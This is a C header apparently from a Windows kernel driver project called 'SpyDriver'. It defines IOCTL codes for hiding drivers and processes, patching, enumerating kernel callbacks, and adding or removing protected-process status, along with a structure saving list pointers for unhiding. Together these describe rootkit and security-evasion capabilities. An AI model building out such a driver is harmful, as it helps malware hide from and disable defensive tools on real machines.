#pragma once

// ---------------------------------------------------------------
// Define device and symbolic link names for driver
// ---------------------------------------------------------------
#define DEVICE_NAME L"\\Device\\SpyDriver" 
#define SYMLINK_NAME L"\\??\\SpyDriverLink"

// ---------------------------------------------------------------
// Define IOCTL codes
// ---------------------------------------------------------------
#define IOCTL_SPY_PCALLBACK   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2050, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PATCH       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2051, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_DLIST       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2052, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_DHIDE       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2053, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PLIST       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2054, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PHIDE       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2055, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_UPDATE      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2056, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PPL         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2057, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_UNPPL       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2058, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_TCALLBACK   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2059, METHOD_BUFFERED, FILE_ANY_ACCESS)
// ---------------------------------------------------------------
// Common defines use by client 
// ---------------------------------------------------------------
#define DRIVER_LINK L"\\\\.\\SpyDriverLink" // used by client to open driver
#define BUFFER_SIZE 65536  // 64 KB

// ---------------------------------------------------------------
// Input structure for hide driver/process IOCTLs
// ---------------------------------------------------------------

typedef struct _SPY_HIDE_INPUT {
    CHAR g_Name[256];
} SPY_HIDE_INPUT, * PSPY_HIDE_INPUT;

// ---------------------------------------------------------------
// Global Saves (Future backup use)
// ---------------------------------------------------------------
// Driver unhide saving Flink and Blink pointers
typedef struct _SPY_UNHIDE_SAVE {
    char g_Name[256];
    PLIST_ENTRY Flink;
    PLIST_ENTRY Blink;
} SPY_DRIVER_UNHIDE_SAVE, * PSPY_DRIVER_UNHIDE_SAVE;

// ---------------------------------------------------------------
// Helper Functions
// ---------------------------------------------------------------
// Convert ASCII string in g_Name to ULONG PID
ULONG ParsePidFromString(const CHAR* str)
{
    ULONG pid = 0;
    if (!str) return 0;

    while (*str >= '0' && *str <= '9') {
        pid = pid * 10 + (*str - '0');
        str++;
    }
    return pid;
}
